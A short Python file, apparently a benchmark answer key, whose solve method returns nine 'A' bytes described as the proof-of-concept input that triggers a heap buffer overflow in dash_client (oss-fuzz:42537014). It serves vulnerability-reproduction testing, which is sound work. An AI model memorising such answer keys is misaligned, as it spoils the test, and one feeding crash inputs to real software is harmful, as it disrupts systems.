class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground-truth PoC for oss-fuzz:42537014 in dash_client
        # Triggers heap buffer overflow due to unchecked string length
        return b'AAAAAAAAA'
